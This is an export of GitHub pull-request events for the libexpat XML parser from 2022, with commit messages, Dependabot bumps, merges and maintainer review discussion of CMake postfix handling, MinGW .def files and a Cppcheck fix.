595,RenameTitle,2022-04-01 16:01:02,hartwork,fork_merge,,"{""rename"": {""from"": ""[STYLE] Added parentheses around macro argument"", ""to"": ""[style] Added parentheses around macro arguments""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6353580711""}"
595,MergePR,2022-04-19 17:51:08,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6457265272"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/38b14bb2daf2c21a6f88b38b62369498d737b037""}"
596,SubmitCommit,2022-04-08 17:55:48,hartwork,unfork_merge,autotools: Sync expat.cmake to agree with CI,"{""sha"": ""1ba57f7858a5a36940324075fcb8db0705aecb6c"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-04-08T17:54:46Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-04-08T17:55:48Z""}}"
596,OpenPR,2022-04-08 17:56:48,hartwork,unfork_merge,,
596,MergePR,2022-04-08 18:51:37,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6398536934"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/88faa785fd6d76e57afc9e364f0348e58389b6f1""}"
596,DeleteBranch,2022-04-12 19:43:25,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6421857138"", ""commit_url"": null}"
598,SubmitCommit,2022-04-12 20:25:57,hartwork,unfork_merge,appveyor.yml: Add MSVC 2022,"{""sha"": ""53ff63e199c01c5771e15e2786c24a08a72cd3d0"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-04-12T19:46:59Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-04-12T20:25:57Z""}}"
598,Labeled,2022-04-12 20:26:52,hartwork,unfork_merge,enhancement,
598,Labeled,2022-04-12 20:26:52,hartwork,unfork_merge,windows,
598,OpenPR,2022-04-12 20:26:52,hartwork,unfork_merge,,
598,CrossReferenced,2022-04-12 20:28:32,hartwork,unfork_merge,building expat 2.4.8 on windows using static runtime fails,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/597"", ""is_pull_request"": false}}"
598,MergePR,2022-04-12 21:36:43,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6422543663"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/dd969fc5d9e1087200c8db3d78d71947842d2087""}"
598,DeleteBranch,2022-04-16 11:36:18,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6443308181"", ""commit_url"": null}"
599,SubmitCommit,2022-04-16 12:03:15,hartwork,unfork_merge,CMake: Extract loop to resolve runtests/runtestspp duplication,"{""sha"": ""aaf785b842b20ab0a184aea7824501eb32a3676e"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-04-16T11:39:56Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-04-16T12:03:15Z""}}"
599,SubmitCommit,2022-04-16 12:03:15,hartwork,unfork_merge,CMake: Add missing section comment for fuzzers,"{""sha"": ""6c7c40a6b755d78eed17435421ac55df115229c6"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-04-16T11:44:39Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-04-16T12:03:15Z""}}"
599,SubmitCommit,2022-04-16 13:17:49,hartwork,unfork_merge,CMake: Add missing XML_STATIC to test runners and fuzzers on Windows,"{""sha"": ""4b92533bbe88733547c03d1fac311ab685912370"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-04-16T11:49:15Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-04-16T13:17:49Z""}}"
599,Labeled,2022-04-16 13:51:58,hartwork,unfork_merge,compilation,
599,Labeled,2022-04-16 13:51:58,hartwork,unfork_merge,windows,
599,OpenPR,2022-04-16 13:51:58,hartwork,unfork_merge,,
599,CrossReferenced,2022-04-16 13:53:40,hartwork,unfork_merge,building expat 2.4.8 on windows using static runtime fails,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/597"", ""is_pull_request"": false}}"
599,MergePR,2022-04-19 17:50:28,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6457261631"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/d010395c09553776534eaa569e03ef4a71921065""}"
599,DeleteBranch,2022-04-20 11:19:40,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6462315799"", ""commit_url"": null}"
600,SubmitCommit,2022-04-18 12:10:04,dependabot[bot],unfork_merge,"Actions(deps): Bump actions/checkout from 3.0.0 to 3.0.1

Bumps [actions/checkout](https://github.com/actions/checkout) from 3.0.0 to 3.0.1.
- [Release notes](https://github.com/actions/checkout/releases)
- [Changelog](https://github.com/actions/checkout/blob/main/CHANGELOG.md)
- [Commits](https://github.com/actions/checkout/compare/v3.0.0...v3.0.1)

---
updated-dependencies:
- dependency-name: actions/checkout
  dependency-type: direct:production
  update-type: version-update:semver-patch
...

Signed-off-by: dependabot[bot] <support@github.com>","{""sha"": ""00036b3e6e303773e741f99be55e444c29e3c4f6"", ""author"": {""name"": ""dependabot[bot]"", ""email"": ""49699333+dependabot[bot]@users.noreply.github.com"", ""date"": ""2022-04-18T12:10:04Z""}, ""committer"": {""name"": ""GitHub"", ""email"": ""noreply@github.com"", ""date"": ""2022-04-18T12:10:04Z""}}"
600,OpenPR,2022-04-18 12:10:05,dependabot[bot],unfork_merge,,
600,Labeled,2022-04-18 12:10:06,dependabot[bot],unfork_merge,enhancement,
600,MergePR,2022-04-18 14:56:08,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6448478583"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/967fb8bb6ea44b122a57127e01c1e9c1182bb0c6""}"
600,DeleteBranch,2022-04-18 14:56:16,dependabot[bot],unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6448479311"", ""commit_url"": null}"
601,SubmitCommit,2022-04-20 06:08:31,orbitcowboy,fork_merge,[style] Added parentheses around macro arguments,"{""sha"": ""20c691ff8ac3f82224da7899971c6b332bd0323c"", ""author"": {""name"": ""orbitcowboy"", ""email"": ""orbitcowboy@web.de"", ""date"": ""2022-04-20T06:08:31Z""}, ""committer"": {""name"": ""orbitcowboy"", ""email"": ""orbitcowboy@web.de"", ""date"": ""2022-04-20T06:08:31Z""}}"
601,OpenPR,2022-04-20 06:09:13,orbitcowboy,fork_merge,,
601,Revise,2022-04-20 06:17:07,orbitcowboy,fork_merge,Apply clang-format,"{""sha"": ""dd0148e65eaf271c0e1ff92a414a4f4910a02a4c"", ""author"": {""name"": ""orbitcowboy"", ""email"": ""orbitcowboy@web.de"", ""date"": ""2022-04-20T06:17:07Z""}, ""committer"": {""name"": ""orbitcowboy"", ""email"": ""orbitcowboy@web.de"", ""date"": ""2022-04-20T06:17:07Z""}}"
601,MergePR,2022-04-20 10:43:54,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6462100140"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/dc156ea1685f8c162f9798c5d8c1e32d23d2ab2f""}"
602,SubmitCommit,2022-04-25 12:06:42,dependabot[bot],unfork_merge,"Actions(deps): Bump actions/checkout from 3.0.1 to 3.0.2

Bumps [actions/checkout](https://github.com/actions/checkout) from 3.0.1 to 3.0.2.
- [Release notes](https://github.com/actions/checkout/releases)
- [Changelog](https://github.com/actions/checkout/blob/main/CHANGELOG.md)
- [Commits](https://github.com/actions/checkout/compare/v3.0.1...v3.0.2)

---
updated-dependencies:
- dependency-name: actions/checkout
  dependency-type: direct:production
  update-type: version-update:semver-patch
...

Signed-off-by: dependabot[bot] <support@github.com>","{""sha"": ""1e1bceb379bf41bbd88709dc978bd2f0456eb21f"", ""author"": {""name"": ""dependabot[bot]"", ""email"": ""49699333+dependabot[bot]@users.noreply.github.com"", ""date"": ""2022-04-25T12:06:42Z""}, ""committer"": {""name"": ""GitHub"", ""email"": ""noreply@github.com"", ""date"": ""2022-04-25T12:06:42Z""}}"
602,OpenPR,2022-04-25 12:06:43,dependabot[bot],unfork_merge,,
602,Labeled,2022-04-25 12:06:44,dependabot[bot],unfork_merge,enhancement,
602,MergePR,2022-04-25 18:30:44,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6492718040"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/d444af3b471ae6e1eed3390ee20dfb18da7569c5""}"
602,DeleteBranch,2022-04-25 18:30:54,dependabot[bot],unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6492719168"", ""commit_url"": null}"
603,SubmitCommit,2022-05-23 12:04:59,dependabot[bot],unfork_merge,"Actions(deps): Bump actions/upload-artifact from 3.0.0 to 3.1.0

Bumps [actions/upload-artifact](https://github.com/actions/upload-artifact) from 3.0.0 to 3.1.0.
- [Release notes](https://github.com/actions/upload-artifact/releases)
- [Commits](https://github.com/actions/upload-artifact/compare/v3.0.0...v3.1.0)

---
updated-dependencies:
- dependency-name: actions/upload-artifact
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>","{""sha"": ""3c6aaff6668f08efdfc6fb93c707cd3436a702a5"", ""author"": {""name"": ""dependabot[bot]"", ""email"": ""49699333+dependabot[bot]@users.noreply.github.com"", ""date"": ""2022-05-23T12:04:59Z""}, ""committer"": {""name"": ""GitHub"", ""email"": ""noreply@github.com"", ""date"": ""2022-05-23T12:04:59Z""}}"
603,OpenPR,2022-05-23 12:05:00,dependabot[bot],unfork_merge,,
603,Labeled,2022-05-23 12:05:01,dependabot[bot],unfork_merge,enhancement,
603,MergePR,2022-05-24 19:18:39,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6671763902"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/f4501351122606348065d58f62ac06cb7e68a910""}"
603,DeleteBranch,2022-05-24 19:18:49,dependabot[bot],unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6671765361"", ""commit_url"": null}"
606,OpenPR,2022-06-27 09:02:29,Tieske,fork_close,,
606,Revise,2022-06-27 09:20:10,Tieske,fork_close,"feat(bla) setting bla options

Setting the options can always be done. But will always fail if
the compiler options aren't set.","{""sha"": ""c827b11f6df0b66f38c4287686e8f45f3ad7074c"", ""author"": {""name"": ""Thijs Schreijer"", ""email"": ""thijs@thijsschreijer.nl"", ""date"": ""2022-06-21T15:01:41Z""}, ""committer"": {""name"": ""Thijs Schreijer"", ""email"": ""thijs@thijsschreijer.nl"", ""date"": ""2022-06-27T09:20:10Z""}}"
606,Revise,2022-06-27 09:20:10,Tieske,fork_close,chore(bla) set bla error on bad setting,"{""sha"": ""9268bae2761c9fcca03418b6621861b9172e702c"", ""author"": {""name"": ""Thijs Schreijer"", ""email"": ""thijs@thijsschreijer.nl"", ""date"": ""2022-06-27T08:54:12Z""}, ""committer"": {""name"": ""Thijs Schreijer"", ""email"": ""thijs@thijsschreijer.nl"", ""date"": ""2022-06-27T09:20:10Z""}}"
606,Revise,2022-06-27 09:20:10,Tieske,fork_close,chore(parser) linter errors unused params,"{""sha"": ""13a290e3da6b689a9f31933ad90f976f14c7ca32"", ""author"": {""name"": ""Thijs Schreijer"", ""email"": ""thijs@thijsschreijer.nl"", ""date"": ""2022-06-27T09:12:28Z""}, ""committer"": {""name"": ""Thijs Schreijer"", ""email"": ""thijs@thijsschreijer.nl"", ""date"": ""2022-06-27T09:20:10Z""}}"
606,HeadRefForcePushed,2022-06-27 09:20:18,Tieske,fork_close,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6883528295"", ""commit_url"": null}"
606,IssueComment,2022-06-27 09:35:14,Tieske,fork_close,The CI failure seems unrelated; https://github.com/libexpat/libexpat/runs/7069785092?check_suite_focus=true#step:4:17 ? any advice?,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1167117972"", ""author_association"": ""CONTRIBUTOR""}"
606,IssueComment,2022-07-05 18:45:10,Tieske,fork_close,@hartwork any input on this?,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1175378529"", ""author_association"": ""CONTRIBUTOR""}"
606,Revise,2022-07-06 07:13:53,Tieske,fork_close,chore(parser) fix uninitialized linter error,"{""sha"": ""a4557fb729ef4df70d3d98e08f632e36d568b5e7"", ""author"": {""name"": ""Thijs Schreijer"", ""email"": ""thijs@thijsschreijer.nl"", ""date"": ""2022-07-06T07:13:53Z""}, ""committer"": {""name"": ""Thijs Schreijer"", ""email"": ""thijs@thijsschreijer.nl"", ""date"": ""2022-07-06T07:13:53Z""}}"
606,IssueComment,2022-07-16 19:15:36,hartwork,fork_close,"Hi @Tieske ,

> The CI failure seems unrelated; https://github.com/libexpat/libexpat/runs/7069785092?check_suite_focus=true#step:4:17 ? any advice?

it seems you have a found fix yourself by now.

> @hartwork any input on this?

I'm not yet sure this is the best direction to go forward.  Related thoughts are:

- There are other symbols whose visibilty depends on macro `XML_ATTR_INFO`.  So fixing the `XML_DTD` part is only half of the picture.

- Exposing these functions at all build times now will mis-lead any third party build systems that currently check for function presence into believing the feature is functioning.  I'm not sure how relevant that aspect is.

- An alternative fix to the out-of-sync `.def` file issue #512 would be to adjust on the other side of the equation, i.e. to auto-generate `.def` files and make sure they only include visible symbols, e.g. by rendering a template.  Would probably only need to be done for CMake build system, not the GNU Autotools one.

- I'm not sure if we should start setting `parser->m_errorCode` in that function, because (1) only the core parsing functions seem to write to that member as of today (see below) and (2) application code checking for it would need to also come with a >=2.4.9 version guard and know nothing with older releases.

Regarding where `parser->m_errorCode` is currently written:

```
# git --no-pager grep -h 'parser->m_errorCode = XML_\|^XML_' -- lib/xmlparse.c | sed 's,^ \+,  ,' | fgrep -B1 = | grep -o '^XML_[^ (]\+' | sort
XML_GetBuffer
XML_Parse
XML_ParseBuffer
XML_ParserCreate_MM
XML_ResumeParser
XML_StopParser
```

Best, Sebastian
","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1186270041"", ""author_association"": ""MEMBER""}"
606,RenameTitle,2022-07-16 19:17:43,hartwork,fork_close,,"{""rename"": {""from"": ""feat(bla) setting bla options"", ""to"": ""Make XML_SetBillionLaughsAttackProtection* functions available despite EXPAT_DTD=OFF""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7006469451""}"
606,IssueCommentSupplement,2022-07-22 12:53:15,Tieske,fork_close,"@hartwork thx for the elaborate answer. Does indeed seem not to be in line with the way the lib is set up.

I'll create a follow up PR with the minor items found, and will close this.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1192542741"", ""author_association"": ""CONTRIBUTOR""}"
606,ClosePR,2022-07-22 12:53:16,Tieske,fork_close,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7046295776"", ""commit_url"": null}"
606,DeleteBranch,2022-07-22 12:53:21,Tieske,fork_close,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7046296393"", ""commit_url"": null}"
607,SubmitCommit,2022-06-29 13:41:39,dfaure-kdab,fork_close,"Set target properties *_POSTFIX instead of global vars CMAKE_*_POSTFIX

This fixes unwanted side effects when libexpat is used with FetchContent
in another cmake-based project. Setting CMAKE_*_POSTFIX affects the
whole project, while here we only want to define the postfix for libexpat
itself.","{""sha"": ""168672639e4929804b1334179c2645901a2201f3"", ""author"": {""name"": ""David Faure"", ""email"": ""david.faure@kdab.com"", ""date"": ""2022-06-29T13:41:39Z""}, ""committer"": {""name"": ""David Faure"", ""email"": ""david.faure@kdab.com"", ""date"": ""2022-06-29T13:41:39Z""}}"
607,OpenPR,2022-06-29 13:44:45,dfaure-kdab,fork_close,,
607,ClosePR,2022-06-29 14:38:57,dfaure-kdab,fork_close,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6903062116"", ""commit_url"": null}"
607,IssueCommentSupplement,2022-06-29 14:40:29,dfaure-kdab,fork_close,"(the MR didn't update after the force-push to my clone, recreating it, sorry for the noise)","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1170069836"", ""author_association"": ""CONTRIBUTOR""}"
608,OpenPR,2022-06-29 14:39:37,dfaure-kdab,fork_merge,,
608,ReviewRejected,2022-07-14 21:24:20,hartwork,fork_merge,"Hi @dfaure-kdab ,

I understand and support the general direction, thanks for bringing this up :+1: 
On a few details:

- Is there a strong reason why the code has been moved down in the file?
  Else, let's move it back in place fore a more self-explaining diff, please.

- Previously, defining `CMAKE_*_POSTFIX` variables would affect Expat:
  ```
  # git clone --depth 1 https://github.com/libexpat/libexpat/
  # cd libexpat/expat
  # cmake -S . -DCMAKE_NOCONFIG_POSTFIX=abc | fgrep abc
  --   Library name postfix ....... abc
  ```
  After this pull request it no longer will.  Maybe we should to do additional `if(DEFINED ..)` work to keep that behavior intact?

- There is a section in the readme about available options and the command to generate the related listing at the very bottom of the file. It would be nice to get the listing in the readme back in sync now that we add five more public variables.
","{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/608#pullrequestreview-1039497630""}"
608,ReviewRejected,2022-07-15 22:55:00,hartwork,fork_merge,"PS: @dfaure-kdab a quick update:

Regarding my comment above about keeping support for explicit `CMAKE_${postfix_var}`, I believe we would need this order of preference:

  1. Explicit `EXPAT_${postfix_var}`
  2. Explicit `CMAKE_${postfix_var}`
  3. Computed default value
    
When drafting an implemenation over here, I envisioned something like this:

```cmake
if(NOT DEFINED EXPAT_${postfix_var})
    if(DEFINED CMAKE_${postfix_var})
        set(postfix ""${CMAKE_${postfix_var}}"")
    else()
        set(postfix ""${_POSTFIX_WIDE}${_POSTFIX_DEBUG}${_POSTFIX_CRT}"")
    endif()
    set(EXPAT_${postfix_var} ""${postfix}"" CACHE ......)
endif()

set_property(TARGET expat PROPERTY ${postfix_var} ""${EXPAT_${postfix_var}}"")
```

PS: With the Cppcheck warning fixed by merged pull request #610, a rebase onto latest `master` has realistic chances on a green CI.

Looking forward to what you think, cheers :beers:","{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/608#pullrequestreview-1040872714""}"
608,RenameTitle,2022-07-16 19:18:09,hartwork,fork_merge,,"{""rename"": {""from"": ""Set target properties *_POSTFIX instead of global vars CMAKE_*_POSTFIX"", ""to"": ""CMake: Set target properties *_POSTFIX instead of global vars CMAKE_*_POSTFIX""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7006469780""}"
608,ReviewRejected,2022-07-17 15:16:53,hartwork,fork_merge,@dfaure-kdab maybe I'm over-complicating. Maybe plain `EXPAT_${postfix_var}` is enough: It can do everything and the build system does not have strict requirements on a stable API…,"{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/608#pullrequestreview-1041140683""}"
608,IssueComment,2022-07-27 17:02:46,dfaure-kdab,fork_merge,">     * Is there a strong reason why the code has been moved down in the file?

Yes, I like diffs to be as difficult to read as possible :-)
More seriously, this is because `set_property(TARGET expat ...` requires the target `expat` to have been defined first.

>     * Previously, defining `CMAKE_*_POSTFIX` variables would affect Expat:
>       ```
>       # git clone --depth 1 https://github.com/libexpat/libexpat/
>       # cd libexpat/expat
>       # cmake -S . -DCMAKE_NOCONFIG_POSTFIX=abc | fgrep abc
>       --   Library name postfix ....... abc
>       ```
>       After this pull request it no longer will.  Maybe we should to do additional `if(DEFINED ..)` work to keep that behavior intact?

Are you aware of anyone actually doing that? I wonder if there's a real-world use case.

>     * There is a section in the readme about available options and the command to generate the related listing at the very bottom of the file. It would be nice to get the listing in the readme back in sync now that we add five more public variables.

Fair point (although it's discoverable in cmake-gui).

> Maybe plain EXPAT_${postfix_var} is enough

I would think so too, if indeed the use cases for changing the default postfixes are very rare corner cases.
Generally speaking I see the point of preserving source compatibility - in the buildsystem too - but whether the complexity of the resulting cmakelists code is worth it.... that's for you to decide, really :-)
","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1197049916"", ""author_association"": ""CONTRIBUTOR""}"
608,Revise,2022-07-27 17:03:46,dfaure-kdab,fork_merge,"Set target properties *_POSTFIX instead of global vars CMAKE_*_POSTFIX

This fixes unwanted side effects when libexpat is used with FetchContent
in another cmake-based project. Setting CMAKE_*_POSTFIX affects the
whole project, while here we only want to define the postfix for libexpat
itself.","{""sha"": ""5a263e75162f899eb85d2415db61726991c2f94e"", ""author"": {""name"": ""David Faure"", ""email"": ""david.faure@kdab.com"", ""date"": ""2022-06-29T13:41:39Z""}, ""committer"": {""name"": ""David Faure"", ""email"": ""david.faure@kdab.com"", ""date"": ""2022-07-27T17:03:46Z""}}"
608,HeadRefForcePushed,2022-07-27 17:04:08,dfaure-kdab,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7074735999"", ""commit_url"": null}"
608,IssueComment,2022-07-27 21:17:07,hartwork,fork_merge,"> Yes, I like diffs to be as difficult to read as possible :-) More seriously, this is because `set_property(TARGET expat ...` requires the target `expat` to have been defined first.

@dfaure-kdab thanks for the explanation :+1: 

> Are you aware of anyone actually doing that? I wonder if there's a real-world use case.

Not aware of any at the moment, no. 

> Fair point (although it's discoverable in cmake-gui).

In the interest of moving forward, I'll do readme fixing in a _new_ pull request myself and merge what we have here now. I hope that's in your interest, too.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1197377846"", ""author_association"": ""MEMBER""}"
608,MergePR,2022-07-27 21:17:44,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7076603302"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/6f746094be82638943d72ea083dfc7e26bb03150""}"
608,Labeled,2022-07-27 21:17:50,hartwork,fork_merge,enhancement,
608,Referenced,2022-07-27 21:47:21,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7076739055"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/2a2f71e924fbbd671b49852f5752370d832a1624""}"
608,Referenced,2022-07-27 21:47:21,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7076739051"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/bdaa94b9b83826940a732ff7bd9b77cab739b742""}"
608,CrossReferenced,2022-07-27 21:48:15,hartwork,fork_merge,CMake: Improve documentation on variables,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/620"", ""is_pull_request"": true}}"
608,Referenced,2022-07-27 21:51:46,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7076758503"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/204d5864c2cae9bb4c8a82b91f805e06fa08e9d9""}"
608,Referenced,2022-07-27 21:51:46,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7076758509"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/21e7c8f8f0d215aaee186abbc2343253ac4b22e9""}"
608,Referenced,2022-07-27 21:59:14,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7076791676"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/0e9bd32b309ca466cbf2fa020e47957db977ea14""}"
608,Referenced,2022-07-27 21:59:14,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7076791683"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/fa78916cd53eb15c967df0112d10c61ec7846a3a""}"
608,Referenced,2022-07-27 22:15:31,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7076864020"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/260c5190be3894d5be5a8e4e823dc41339ec9ee8""}"
608,CrossReferenced,2022-08-01 19:09:11,hartwork,fork_merge,MinGW DLL name: Inconsistency between CMake and GNU Autotools build systems,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/622"", ""is_pull_request"": false}}"
608,CrossReferenced,2022-10-03 22:10:50,Osyotr,fork_merge,[2.4.9] CMake: Fix generation of pkgconfig file,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/656"", ""is_pull_request"": true}}"
609,SubmitCommit,2022-07-14 20:26:59,hartwork,unfork_merge,.mailmap: Add Martin Ettl,"{""sha"": ""24fa196ae8878b804fc2f8b3760de1f54c7439a7"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-07-14T20:23:17Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-07-14T20:26:59Z""}}"
609,SubmitCommit,2022-07-14 20:26:59,hartwork,unfork_merge,Sync file headers,"{""sha"": ""39b2e99355039626438d48a4eca6aacba2b44d5e"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-07-14T20:19:15Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-07-14T20:26:59Z""}}"
609,SubmitCommit,2022-07-14 20:27:25,hartwork,unfork_merge,COPYING: cp expat/COPYING ./,"{""sha"": ""34f57a0b3033bd6eff689e613ebf3eed56b2d1c7"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-07-14T20:27:25Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-07-14T20:27:25Z""}}"
609,Labeled,2022-07-14 20:31:50,hartwork,unfork_merge,enhancement,
609,OpenPR,2022-07-14 20:31:50,hartwork,unfork_merge,,
609,MergePR,2022-07-14 21:29:06,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6997498253"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/4e91da28fba7082fdc2b61b36fc98de89492b029""}"
609,DeleteBranch,2022-07-15 21:09:17,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7004744510"", ""commit_url"": null}"
610,SubmitCommit,2022-07-15 21:27:44,hartwork,unfork_merge,"lib: Address Cppcheck 2.8.1 warning

expat/lib/xmlparse.c:4288:21: error: Uninitialized variable: &versionend [uninitvar]
          &version, &versionend, &encodingName, &newEncoding, &standalone)) {
                    ^","{""sha"": ""6101fbc18e43f0c3b6561440c79e7409610e18db"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-07-15T21:23:47Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-07-15T21:27:44Z""}}"
610,Labeled,2022-07-15 21:30:00,hartwork,unfork_merge,enhancement,
610,OpenPR,2022-07-15 21:30:00,hartwork,unfork_merge,,
610,MergePR,2022-07-15 22:30:42,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7005105236"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/68e60b56779148eca06cfd2d9ac1d7f343f22954""}"
610,DeleteBranch,2022-07-15 22:56:06,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7005182737"", ""commit_url"": null}"
611,SubmitCommit,2022-07-18 21:37:22,neheb,fork_merge,"expat: fix def files for MinGW

MinGW expects a populated LIBRARY field. Alternatively it can just be
removed.

Signed-off-by: Rosen Penev <rosenp@gmail.com>","{""sha"": ""e36bcc2c400d22462119602a0adeacf94276dcfe"", ""author"": {""name"": ""Rosen Penev"", ""email"": ""rosenp@gmail.com"", ""date"": ""2022-07-18T21:37:22Z""}, ""committer"": {""name"": ""Rosen Penev"", ""email"": ""rosenp@gmail.com"", ""date"": ""2022-07-18T21:37:22Z""}}"
611,OpenPR,2022-07-18 21:38:28,neheb,fork_merge,,
611,ReviewComment,2022-07-19 00:03:01,hartwork,fork_merge,"Hi @neheb,

out of the two current build systems, the CMake one only uses the def files with MSVC and the GNU Autotools one doesn't use them at all. Please help me understand the motivation behind this change better. What's the idea?

Thanks and best, Sebastian","{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/611#pullrequestreview-1042676353""}"
611,IssueComment,2022-07-19 00:09:54,neheb,fork_merge,"Ah. The way I noticed this was with the wrapdb version of libexpat: https://github.com/mesonbuild/wrapdb/blob/master/subprojects/packagefiles/expat/meson.build#L156

My understanding is that the recommendation is so use .def files, even with mingw.

An alternative to this PR is to do

```
LIBRARY libexpat.dll
```

what do you think?","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1188456310"", ""author_association"": ""CONTRIBUTOR""}"
